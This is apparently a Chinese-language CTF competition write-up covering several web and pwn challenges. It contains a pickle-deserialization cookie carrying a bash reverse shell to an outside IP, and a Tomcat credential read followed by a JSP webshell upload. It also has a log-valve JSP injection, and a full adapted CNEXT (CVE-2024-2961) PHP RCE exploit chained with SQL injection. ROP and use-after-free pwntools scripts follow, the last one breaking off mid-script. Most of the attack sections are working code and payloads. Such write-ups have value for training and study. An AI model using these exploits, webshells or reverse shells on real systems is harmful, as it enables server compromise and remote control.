import base64import hashlibimport hmacimport picklefrom flask import make_response, requestunicode = strbasestring = str# Quoted from python bottle template, thanks :Ddef cookie_encode(data, key):    msg = base64.b64encode(pickle.dumps(data, -1))    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())    return tob(&#x27;!&#x27;) + sig + tob(&#x27;?&#x27;) + msgdef cookie_decode(data, key):    data = tob(data)    if cookie_is_encoded(data):        sig, msg = data.split(tob(&#x27;?&#x27;), 1)        if _lscmp(sig[1:], base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())):            return pickle.loads(base64.b64decode(msg))    return Nonedef waf(data):    blacklist = [b&#x27;R&#x27;, b&#x27;secret&#x27;, b&#x27;eval&#x27;, b&#x27;file&#x27;, b&#x27;compile&#x27;, b&#x27;open&#x27;, b&#x27;os.popen&#x27;]    valid = False    for word in blacklist:        if word in data:            valid = True            # print(word)            break    return validdef cookie_check(key, secret=None):    a = request.cookies.get(key)    data = tob(request.cookies.get(key))    if data:        if cookie_is_encoded(data):            sig, msg = data.split(tob(&#x27;?&#x27;), 1)            if _lscmp(sig[1:], base64.b64encode(hmac.new(tob(secret), msg, digestmod=hashlib.md5).digest())):                res = base64.b64decode(msg)                if waf(res):                    return True                else:                    return False        return True    else:        return Falsedef tob(s, enc=&#x27;utf8&#x27;):    return s.encode(enc) if isinstance(s, unicode) else bytes(s)def get_cookie(key, default=None, secret=None):    value = request.cookies.get(key)    if secret and value:        dec = cookie_decode(value, secret)        return dec[1] if dec and dec[0] == key else default    return value or defaultdef cookie_is_encoded(data):    return bool(data.startswith(tob(&#x27;!&#x27;)) and tob(&#x27;?&#x27;) in data)def _lscmp(a, b):    return not sum(0 if x == y else 1 for x, y in zip(a, b)) and len(a) == len(b)def set_cookie(name, value, secret=None, **options):    if secret:        value = touni(cookie_encode((name, value), secret))        resp = make_response(&quot;success&quot;)        resp.set_cookie(&quot;user&quot;, value, max_age=3600)        return resp    elif not isinstance(value, basestring):        raise TypeError(&#x27;Secret key missing for non-string Cookie.&#x27;)    if len(value) &gt; 4096:        raise ValueError(&#x27;Cookie value to long.&#x27;)def touni(s, enc=&#x27;utf8&#x27;, err=&#x27;strict&#x27;):    return s.decode(enc, err) if isinstance(s, bytes) else unicode(s)


其中/board路由会读取cookie，并进行一次pickle.loads
在本地制作一个cookie后复制到靶机即可实现pickle反序列化
waf很宽松，约等于没有，使用i执行反弹shell即可
import cookiefrom flask import Flasksecret_code = &quot;EnjoyThePlayTime123456&quot;app = Flask(__name__)payload = b&#x27;&#x27;&#x27;(S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/47.99.77.52/8888 0&gt;&amp;1&quot;&#x27;iossystem.&#x27;&#x27;&#x27;@app.route(&quot;/&quot;)def index():    return cookie.set_cookie(&quot;user&quot;, payload, secret=secret_code)if __name__ == &#x27;__main__&#x27;:    app.run()


tomtom2题目给了一个只能读xml文件的接口
那就去读tomcat的配置文件
/myapp/read?filename=conf/tomcat-users.xml
tomcat-users中存在后台账号密码
&lt;user username=&quot;admin&quot; password=&quot;This_is_my_favorite_passwd&quot; roles=&quot;manager-gui&quot;/&gt;


登录后有一个文件上传，测试后发现只能上传xml文件，同时上传的path参数是可控的
那么可以覆盖靶机的WEB-INF/web.xml文件来自定义一个Servlet
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;         version=&quot;4.0&quot;&gt;  &lt;servlet&gt;    &lt;servlet-name&gt;shell&lt;/servlet-name&gt;    &lt;jsp-file&gt;/WEB-INF/1.xml&lt;/jsp-file&gt;    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;shell&lt;/servlet-name&gt;    &lt;url-pattern&gt;/shell&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;&lt;/web-app&gt;


然后再传一个1.xml小马
&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c)&#123;    StringBuilder line = new StringBuilder();try&#123;    Process pro = Runtime.getRuntime().exec(c);    BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));    String temp = null;    while ((temp = buf.readLine()) != null)    &#123;        line.append(temp+&quot;\\n&quot;);    &#125;    buf.close();&#125;catch (Exception e)&#123;    line.append(e.getMessage());&#125;return line.toString();&#125;%&gt;&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;)))&#123;    out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&lt;/pre&gt;&quot;);&#125;else&#123;    out.println(&quot;:-)&quot;);&#125;%&gt;


然后访问/myapp/shell即可rce

tomtom2_revenge前面和tomtom2一样，只是不能上传web.xml了，但还能上传其他xml，这样可以传一份context.xml
通过设置日志路径来写入jsp文件

修改下得到
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Context&gt;    &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;/opt/tomcat/webapps/myapp/&quot; prefix=&quot;log&quot; suffix=&quot;.jsp&quot; pattern=&quot;%&#123;User-Agent&#125;i&quot; resolveHosts=&quot;false&quot; /&gt;&lt;/Context&gt;

然后上传，这里要注意上传到META-INF目录中，而不是WEB-INF目录
再访问一次，User-Agent中带上jsp代码即可
GET /myapp/upload.html HTTP/1.1Host: 139.155.126.78:31506Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: &lt;%= new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter(request.getParameterMap().keySet().toArray(new String[0])[0])).getInputStream()).useDelimiter(request.getParameter(request.getParameterMap().keySet().toArray(new String[0])[1])).next() %&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://139.155.126.78:31506/myapp/login.htmlAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: JSESSIONID=1C384267B4E8256CC990EE792436ECBAConnection: keep-alive


然后请求/myapp/log.2024-08-28.jsp?cmd=ls&amp;1=%5CA

网络照相馆ssrf拿到源码
file://localhost/var/www/html/url.php
&lt;?php//error_reporting(0);include_once &#x27;function.php&#x27;;include_once &#x27;sql.php&#x27;;$baseDir = &quot;data/&quot;;if(isset($_POST[&#x27;url&#x27;]))&#123;    $url = $_POST[&#x27;url&#x27;];    $parse = parse_url($url);    if(!isset($parse[&#x27;host&#x27;]))    &#123;        die(&quot;url错误！&quot;);    &#125;    $data = curl($url);    $filename = $baseDir .  get_filename(8);    file_put_contents($filename , $data);    if (check($conn, $filename, $url))&#123;        file_put_contents($filename , $data);        $sql = &quot;INSERT INTO `data`(`url`,`filename`) VALUES (?, ?)&quot;;        if($stmt = mysqli_prepare($conn, $sql))&#123;            mysqli_stmt_bind_param($stmt, &quot;ss&quot;, $url, $filename);            mysqli_stmt_execute($stmt);        &#125;    &#125;    else&#123;        unlink($filename);    &#125;    echo $data;&#125;?&gt;

file://localhost/var/www/html/function.php
&lt;?phpfunction curl($url)&#123;    $curl = curl_init();    curl_setopt($curl, CURLOPT_URL, $url);    curl_setopt($curl, CURLOPT_HEADER, 0);    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);    $tmpInfo = curl_exec($curl);    curl_close($curl);    return $tmpInfo;&#125;function get_filename($len)&#123;    $chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;;    $var_size = strlen($chars);    $res = &#x27;&#x27;;    for( $x = 0; $x &lt; $len; $x++ ) &#123;        $random_str= $chars[ rand( 0, $var_size - 1 ) ];        $res .= $random_str;    &#125;    $res = date(&quot;Y-m-d&quot;). &#x27;_&#x27; . $res . &#x27;.txt&#x27;;    return $res;&#125;function check($conn , $filename, $url)&#123;    $sql = &quot;SELECT filename from data where url = &#x27;$url&#x27;&quot;;    $result = $conn-&gt;query($sql);    if ($result) &#123;        $row = mysqli_fetch_all($result);        foreach ( $row as $value)&#123;            if( hash_file(&#x27;md5&#x27;, $filename) === hash_file(&#x27;md5&#x27;, $value[0]))&#123;                return false;            &#125;        &#125;    &#125;    return true;&#125;

公告提示说注意hash_file函数，那就很明显可以配合sql注入打hash_file的 CNEXT (CVE-2024-2961)
调整后的exp
1：在Remote类中修改读取文件的逻辑，本题中用file:&#x2F;&#x2F;localhost读取&#x2F;proc&#x2F;self&#x2F;maps和libc2：修改exploit的path，搭配sql注入发送payload给hash_file3：注释掉self.check_vulnerable()的判断
#!/usr/bin/env python3## CNEXT: PHP file-read to RCE (CVE-2024-2961)# Date: 2024-05-27# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)## TODO Parse LIBC to know if patched## INFORMATIONS## To use, implement the Remote class, which tells the exploit how to send the payload.## REQUIREMENTS## Requires ten: https://github.com/cfreal/ten#from __future__ import annotationsimport base64import zlibfrom dataclasses import dataclassfrom requests.exceptions import ConnectionError, ChunkedEncodingErrorfrom pwn import *from ten import *HEAP_SIZE = 2 * 1024 * 1024BUG = &quot;劄&quot;.encode(&quot;utf-8&quot;)class Remote:    &quot;&quot;&quot;A helper class to send the payload and download files.        The logic of the exploit is always the same, but the exploit needs to know how to    download files (/proc/self/maps and libc) and how to send the payload.        The code here serves as an example that attacks a page that looks like:        ```php    &lt;?php        $data = file_get_contents($_POST[&#x27;file&#x27;]);    echo &quot;File contents: $data&quot;;    ```        Tweak it to fit your target, and start the exploit.    &quot;&quot;&quot;    def __init__(self, url: str) -&gt; None:        self.url = url        self.session = Session()    def send(self, path: str) -&gt; Response:        &quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.        &quot;&quot;&quot;        return self.session.post(self.url, data=&#123;&quot;url&quot;: path&#125;)            def download(self, path: str) -&gt; bytes:        &quot;&quot;&quot;Returns the contents of a remote file.        &quot;&quot;&quot;        # path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;        path = f&quot;file://localhost/&#123;path&#125;&quot;        response = self.send(path)        # data = response.re.search(b&quot;File contents: (.*)&quot;, flags=re.S).group(1)        # return base64.decode(data)        return response.content@entry@arg(&quot;url&quot;, &quot;Target URL&quot;)@arg(&quot;command&quot;, &quot;Command to run on the system; limited to 0x140 bytes&quot;)@arg(&quot;sleep_time&quot;, &quot;Time to sleep to assert that the exploit worked. By default, 1.&quot;)@arg(&quot;heap&quot;, &quot;Address of the main zend_mm_heap structure.&quot;)@arg(    &quot;pad&quot;,    &quot;Number of 0x100 chunks to pad with. If the website makes a lot of heap &quot;    &quot;operations with this size, increase this. Defaults to 20.&quot;,)@dataclassclass Exploit:    &quot;&quot;&quot;CNEXT exploit: RCE using a file read primitive in PHP.&quot;&quot;&quot;    url: str    command: str    sleep: int = 1    heap: str = None    pad: int = 20    def __post_init__(self):        self.remote = Remote(self.url)        self.log = logger(&quot;EXPLOIT&quot;)        self.info = &#123;&#125;        self.heap = self.heap and int(self.heap, 16)    def check_vulnerable(self) -&gt; None:        &quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various        wrappers and filters that the exploit needs.        &quot;&quot;&quot;                def safe_download(path: str) -&gt; bytes:            try:                return self.remote.download(path)            except ConnectionError:                failure(&quot;Target not [b]reachable[/] ?&quot;)                    def check_token(text: str, path: str) -&gt; bool:            result = safe_download(path)            return text.encode() == result        text = tf.random.string(50).encode()        base64 = b64(text, misalign=True).decode()        path = f&quot;data:text/plain;base64,&#123;base64&#125;&quot;                result = safe_download(path)                if text not in result:            msg_failure(&quot;Remote.download did not return the test string&quot;)            print(&quot;--------------------&quot;)            print(f&quot;Expected test string: &#123;text&#125;&quot;)            print(f&quot;Got: &#123;result&#125;&quot;)            print(&quot;--------------------&quot;)            failure(&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;)        msg_info(&quot;The [i]data://[/] wrapper works&quot;)        text = tf.random.string(50)        base64 = b64(text.encode(), misalign=True).decode()        path = f&quot;php://filter//resource=data:text/plain;base64,&#123;base64&#125;&quot;        if not check_token(text, path):            failure(&quot;The [i]php://filter/[/] wrapper does not work&quot;)        msg_info(&quot;The [i]php://filter/[/] wrapper works&quot;)        text = tf.random.string(50)        base64 = b64(compress(text.encode()), misalign=True).decode()        path = f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,&#123;base64&#125;&quot;        if not check_token(text, path):            failure(&quot;The [i]zlib[/] extension is not enabled&quot;)        msg_info(&quot;The [i]zlib[/] extension is enabled&quot;)        msg_success(&quot;Exploit preconditions are satisfied&quot;)    def get_file(self, path: str) -&gt; bytes:        with msg_status(f&quot;Downloading [i]&#123;path&#125;[/]...&quot;):            return self.remote.download(path)    def get_regions(self) -&gt; list[Region]:        &quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;        maps = self.get_file(&quot;/proc/self/maps&quot;)        maps = maps.decode()        PATTERN = re.compile(            r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot; r&quot;.*&quot; r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot; r&quot;(.*)&quot;        )        regions = []        for region in table.split(maps, strip=True):            if match := PATTERN.match(region):                start = int(match.group(1), 16)                stop = int(match.group(2), 16)                permissions = match.group(3)                path = match.group(4)                if &quot;/&quot; in path or &quot;[&quot; in path:                    path = path.rsplit(&quot; &quot;, 1)[-1]                else:                    path = &quot;&quot;                current = Region(start, stop, permissions, path)                regions.append(current)            else:                print(maps)                failure(&quot;Unable to parse memory mappings&quot;)        self.log.info(f&quot;Got &#123;len(regions)&#125; memory regions&quot;)        return regions    def get_symbols_and_addresses(self) -&gt; None:        &quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;        regions = self.get_regions()        LIBC_FILE = &quot;/dev/shm/cnext-libc&quot;        # PHP&#x27;s heap        self.info[&quot;heap&quot;] = self.heap or self.find_main_heap(regions)        # Libc        libc = self._get_region(regions, &quot;libc-&quot;, &quot;libc.so&quot;)        self.download_file(libc.path, LIBC_FILE)        self.info[&quot;libc&quot;] = ELF(LIBC_FILE, checksec=False)        self.info[&quot;libc&quot;].address = libc.start    def _get_region(self, regions: list[Region], *names: str) -&gt; Region:        &quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;        for region in regions:            if any(name in region.path for name in names):                break        else:            failure(&quot;Unable to locate region&quot;)        return region    def download_file(self, remote_path: str, local_path: str) -&gt; None:        &quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;        data = self.get_file(remote_path)        Path(local_path).write(data)    def find_main_heap(self, regions: list[Region]) -&gt; Region:        # Any anonymous RW region with a size superior to the base heap size is a        # candidate. The heap is at the bottom of the region.        heaps = [            region.stop - HEAP_SIZE + 0x40            for region in reversed(regions)            if region.permissions == &quot;rw-p&quot;            and region.size &gt;= HEAP_SIZE            and region.stop &amp; (HEAP_SIZE-1) == 0            and region.path == &quot;&quot;        ]        if not heaps:            failure(&quot;Unable to find PHP&#x27;s main heap in memory&quot;)        first = heaps[0]        if len(heaps) &gt; 1:            heaps = &quot;, &quot;.join(map(hex, heaps))            msg_info(f&quot;Potential heaps: [i]&#123;heaps&#125;[/] (using first)&quot;)        else:            msg_info(f&quot;Using [i]&#123;hex(first)&#125;[/] as heap&quot;)        return first    def run(self) -&gt; None:        # self.check_vulnerable()        self.get_symbols_and_addresses()        self.exploit()    def build_exploit_path(self) -&gt; str:        &quot;&quot;&quot;On each step of the exploit, a filter will process each chunk one after the        other. Processing generally involves making some kind of operation either        on the chunk or in a destination chunk of the same size. Each operation is        applied on every single chunk; you cannot make PHP apply iconv on the first 10        chunks and leave the rest in place. That&#x27;s where the difficulties come from.        Keep in mind that we know the address of the main heap, and the libraries.        ASLR/PIE do not matter here.        The idea is to use the bug to make the freelist for chunks of size 0x100 point        lower. For instance, we have the following free list:        ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00        By triggering the bug from chunk ..900, we get:        ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???        That&#x27;s step 3.        Now, in order to control the free list, and make it point whereever we want,        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,        we&#x27;d have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.        That&#x27;s step 2.        Now, if we were to perform step2 an then step3 without anything else, we&#x27;d have        a problem: after step2 has been processed, the free list goes bottom-up, like:        0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900        We need to go the other way around. That&#x27;s why we have step 1: it just allocates        chunks. When they get freed, they reverse the free list. Now step2 allocates in        reverse order, and therefore after step2, chunks are in the correct order.        Another problem comes up.        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.        Since step2 creates chunks that contain pointers and pointers are generally not        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.        To avoid this, we put the chunks in step2 at the very end of the chain, and        prefix them with `0\n`. When dechunked (right before the iconv), they will        &quot;disappear&quot; from the chain, preserving them from the character set conversion        and saving us from an unwanted processing error that would stop the processing        chain.        After step3 we have a corrupted freelist with an arbitrary pointer into it. We        don&#x27;t know the precise layout of the heap, but we know that at the top of the        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.        Its free_slot[] array contains a pointer to each free list. By overwriting it,        we can make PHP allocate chunks whereever we want. In addition, its custom_heap        field contains pointers to hook functions for emalloc, efree, and erealloc        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and        then overwrite the use_custom_heap flag to make PHP use these function pointers        instead. We can now do our favorite CTF technique and get a call to        system(&lt;chunk&gt;).        We make sure that the &quot;system&quot; command kills the current process to avoid other        system() calls with random chunk data, leading to undefined behaviour.        The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the        process is in a random state, we still get contiguous, in order chunks for our        exploit.        Therefore, the whole process described here CANNOT crash. Everything falls        perfectly in place, and nothing can get in the middle of our allocations.        &quot;&quot;&quot;        LIBC = self.info[&quot;libc&quot;]        ADDR_EMALLOC = LIBC.symbols[&quot;__libc_malloc&quot;]        ADDR_EFREE = LIBC.symbols[&quot;__libc_system&quot;]        ADDR_EREALLOC = LIBC.symbols[&quot;__libc_realloc&quot;]        ADDR_HEAP = self.info[&quot;heap&quot;]        ADDR_FREE_SLOT = ADDR_HEAP + 0x20        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10        CS = 0x100        # Pad needs to stay at size 0x100 at every step        pad_size = CS - 0x18        pad = b&quot;\x00&quot; * pad_size        pad = chunked_chunk(pad, len(pad) + 6)        pad = chunked_chunk(pad, len(pad) + 6)        pad = chunked_chunk(pad, len(pad) + 6)        pad = compressed_bucket(pad)        step1_size = 1        step1 = b&quot;\x00&quot; * step1_size        step1 = chunked_chunk(step1)        step1 = chunked_chunk(step1)        step1 = chunked_chunk(step1, CS)        step1 = compressed_bucket(step1)        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to        # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;        step2_size = 0x48        step2 = b&quot;\x00&quot; * (step2_size + 8)        step2 = chunked_chunk(step2, CS)        step2 = chunked_chunk(step2)        step2 = compressed_bucket(step2)        step2_write_ptr = b&quot;0\n&quot;.ljust(step2_size, b&quot;\x00&quot;) + p64(ADDR_FAKE_BIN)        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)        step2_write_ptr = chunked_chunk(step2_write_ptr)        step2_write_ptr = compressed_bucket(step2_write_ptr)        step3_size = CS        step3 = b&quot;\x00&quot; * step3_size        assert len(step3) == CS        step3 = chunked_chunk(step3)        step3 = chunked_chunk(step3)        step3 = chunked_chunk(step3)        step3 = compressed_bucket(step3)        step3_overflow = b&quot;\x00&quot; * (step3_size - len(BUG)) + BUG        assert len(step3_overflow) == CS        step3_overflow = chunked_chunk(step3_overflow)        step3_overflow = chunked_chunk(step3_overflow)        step3_overflow = chunked_chunk(step3_overflow)        step3_overflow = compressed_bucket(step3_overflow)        step4_size = CS        step4 = b&quot;=00&quot; + b&quot;\x00&quot; * (step4_size - 1)        step4 = chunked_chunk(step4)        step4 = chunked_chunk(step4)        step4 = chunked_chunk(step4)        step4 = compressed_bucket(step4)        # This chunk will eventually overwrite mm_heap-&gt;free_slot        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values        step4_pwn = ptr_bucket(            0x200000,            0,            # free_slot            0,            0,            ADDR_CUSTOM_HEAP,  # 0x18            0,            0,            0,            0,            0,            0,            0,            0,            0,            0,            0,            0,            0,            ADDR_HEAP,  # 0x140            0,            0,            0,            0,            0,            0,            0,            0,            0,            0,            0,            0,            0,            size=CS,        )        step4_custom_heap = ptr_bucket(            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18        )        step4_use_custom_heap_size = 0x140        COMMAND = self.command        COMMAND = f&quot;kill -9 $PPID; &#123;COMMAND&#125;&quot;        if self.sleep:            COMMAND = f&quot;sleep &#123;self.sleep&#125;; &#123;COMMAND&#125;&quot;        COMMAND = COMMAND.encode() + b&quot;\x00&quot;        assert (            len(COMMAND) &lt;= step4_use_custom_heap_size        ), f&quot;Command too big (&#123;len(COMMAND)&#125;), it must be strictly inferior to &#123;hex(step4_use_custom_heap_size)&#125;&quot;        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b&quot;\x00&quot;)        step4_use_custom_heap = COMMAND        step4_use_custom_heap = qpe(step4_use_custom_heap)        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)        pages = (            step4 * 3            + step4_pwn            + step4_custom_heap            + step4_use_custom_heap            + step3_overflow            + pad * self.pad            + step1 * 3            + step2_write_ptr            + step2 * 2        )        resource = compress(compress(pages))        resource = b64(resource)        resource = f&quot;data:text/plain;base64,&#123;resource.decode()&#125;&quot;        filters = [            # Create buckets            &quot;zlib.inflate&quot;,            &quot;zlib.inflate&quot;,                        # Step 0: Setup heap            &quot;dechunk&quot;,            &quot;convert.iconv.latin1.latin1&quot;,                        # Step 1: Reverse FL order            &quot;dechunk&quot;,            &quot;convert.iconv.latin1.latin1&quot;,                        # Step 2: Put fake pointer and make FL order back to normal            &quot;dechunk&quot;,            &quot;convert.iconv.latin1.latin1&quot;,                        # Step 3: Trigger overflow            &quot;dechunk&quot;,            &quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;,                        # Step 4: Allocate at arbitrary address and change zend_mm_heap            &quot;convert.quoted-printable-decode&quot;,            &quot;convert.iconv.latin1.latin1&quot;,        ]        filters = &quot;|&quot;.join(filters)        path = f&quot;php://filter/read=&#123;filters&#125;/resource=&#123;resource&#125;&quot;        return path    @inform(&quot;Triggering...&quot;)    def exploit(self) -&gt; None:        path = self.build_exploit_path()        start = time.time()        path = f&quot;http://localhsot/&#x27; union select &#x27;&#123;path&#125;&#x27;#&quot;        try:            self.remote.send(path)        except (ConnectionError, ChunkedEncodingError):            pass                msg_print()                if not self.sleep:            msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;)        elif start + self.sleep &lt;= time.time():            msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;)        else:            # Wrong heap, maybe? If the exploited suggested others, use them!            msg_print(&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;)                msg_print()def compress(data) -&gt; bytes:    &quot;&quot;&quot;Returns data suitable for `zlib.inflate`.    &quot;&quot;&quot;    # Remove 2-byte header and 4-byte checksum    return zlib.compress(data, 9)[2:-4]def b64(data: bytes, misalign=True) -&gt; bytes:    payload = base64.encode(data)    if not misalign and payload.endswith(&quot;=&quot;):        raise ValueError(f&quot;Misaligned: &#123;data&#125;&quot;)    return payload.encode()def compressed_bucket(data: bytes) -&gt; bytes:    &quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot;    return chunked_chunk(data, 0x8000)def qpe(data: bytes) -&gt; bytes:    &quot;&quot;&quot;Emulates quoted-printable-encode.    &quot;&quot;&quot;    return &quot;&quot;.join(f&quot;=&#123;x:02x&#125;&quot; for x in data).upper().encode()def ptr_bucket(*ptrs, size=None) -&gt; bytes:    &quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot;    if size is not None:        assert len(ptrs) * 8 == size    bucket = b&quot;&quot;.join(map(p64, ptrs))    bucket = qpe(bucket)    bucket = chunked_chunk(bucket)    bucket = chunked_chunk(bucket)    bucket = chunked_chunk(bucket)    bucket = compressed_bucket(bucket)    return bucketdef chunked_chunk(data: bytes, size: int = None) -&gt; bytes:    &quot;&quot;&quot;Constructs a chunked representation of the given chunk. If size is given, the    chunked representation has size `size`.    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.    &quot;&quot;&quot;    # The caller does not care about the size: let&#x27;s just add 8, which is more than    # enough    if size is None:        size = len(data) + 8    keep = len(data) + len(b&quot;\n\n&quot;)    size = f&quot;&#123;len(data):x&#125;&quot;.rjust(size - keep, &quot;0&quot;)    return size.encode() + b&quot;\n&quot; + data + b&quot;\n&quot;@dataclassclass Region:    &quot;&quot;&quot;A memory region.&quot;&quot;&quot;    start: int    stop: int    permissions: str    path: str    @property    def size(self) -&gt; int:        return self.stop - self.startExploit()

用法与原来一样
python3 exp.py http://x.x.x.x:10034/url.php &#39;bash -c &quot;bash -i&gt;&amp;/dev/tcp/47.99.77.52/8888 0&gt;&amp;1&quot;&#39;

[初赛] pwnpstack栈溢出
from pwn import *pop_rdi=0x0000000000400773leave=0x4006DBret=0x4006DCread=0x4006C4#p=process(&quot;./pwn&quot;)#gdb.attach(p,f&#x27;bp &#123;leave&#125;&#x27;)p=remote(&quot;139.155.126.78&quot;,&quot;39592&quot;)e=ELF(&quot;./pwn&quot;)libc=ELF(&quot;./libc.so.6&quot;)#libc=ELF(&quot;./libc&quot;)fun_got=e.got[&#x27;puts&#x27;]puts=e.plt[&#x27;puts&#x27;]bss=e.bss(0x800)payload=b&#x27;a&#x27;*0x30+p64(bss)+p64(read)p.sendafter(&quot;rflow?\n&quot;,payload)p.send(p64(bss+0x50)+p64(pop_rdi)+p64(fun_got)+p64(puts)+p64(read)+p64(0)+p64(bss-0x30)+p64(leave))d=u64(p.readuntil(b&#x27;\n&#x27;,drop=1).ljust(8,b&#x27;\x00&#x27;))libc.address=d-libc.sym[&#x27;puts&#x27;]system=libc.sym[&#x27;system&#x27;]bin_sh=next(libc.search(b&#x27;/bin/sh\x00&#x27;))payload=p64(bss)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)+p64(read)+p64(bss+0x50-0x30)+p64(leave)p.send(payload)p.interactive()


TravelGraphuaf
from pwn import *context.arch=&#x27;amd64&#x27;city=[b&quot;guangzhou&quot;,b&quot;nanning&quot;,b&quot;changsha&quot;,b&quot;nanchang&quot;,b&quot;fuzhou&quot;]def add(tool,form,to,data=b&#x27;\n&#x27;,far=999):    tools=[b&#x27;car&#x27;,b&#x27;train&#x27;,b&#x27;plane&#x27;]    p.sendlineafter(b&#x27;distance.&#x27;,b&#x27;1&#x27;)    p.sendlineafter(b&#x27;plane?&#x27;,tools[tool])    p.sendlineafter(b&#x27;where?&#x27;,city[form])    p.sendlineafter(b&#x27;where?&#x27;,city[to])    p.sendlineafter(b&#x27;far?&#x27;,str(far).encode());    p.sendafter(b&#x27;Note:&#x27;,data)    passdef free(form,to):    p.sendlineafter(b&#x27;distance.&#x27;,b&#x27;2&#x27;)    p.sendlineafter(b&#x27;where?&#x27;,city[form])    p.sendlineafter(b&#x27;where?&#x27;,city[to])def show(form,to):    p.sendlineafter(b&#x27;distance.&#x27;,b&#x27;3&#x27;)    p.sendlineafter(b&#x27;where?&#x27;,city[form])    p.sendlineafter(b&#x27;where?&#x27;,city[to])def edit(form,to,ind,data,far=3000):    p.sendlineafter(b&#x27;distance.&#x27;,b&#x27;4&#x27;)    p.sendlineafter(b&#x27;where?&#x27;,city[form])    p.sendlineafter(b&#x27;where?&#x27;,city[to])    p.sendlineafter(b&#x27;change?&#x27;,str(ind).encode())    p.sendlineafter(b&#x27;far?&#x27;,str(far).encode());    p.sendafter(b&#x27;Note:&#x27;,data)def distan():    p.sendlineafter(b&#x27;distance.&#x27;,b&#x27;5&#x27;)    p.sendlineafter(b&#x27;travel&#x27;,city[3])#p=process(&#x27;./pwn&#x27;)p=remote(&quot;139.155.126.78&quot;,&quot;39558&quot;)libc=ELF(&quot;./libc.so.6&quot;)#gdb.attach(p,&#x27;b _IO_obstack_xsputn\nc&#x27;)#context.log_level=&#x27;debug&#x27;add(0,0,1,far=999,data=b&quot;1324&quot;) # 0add(0,1,2,far=999,data=b&quot;321&quot;) #1add(0,2,3,far=999,data=b&quot;132&quot;) #2distan()add(0,3,3)  #3add(0,3,3) #4add(2,3,3) #5add(2,4,4,b&quot;adsf&quot;) 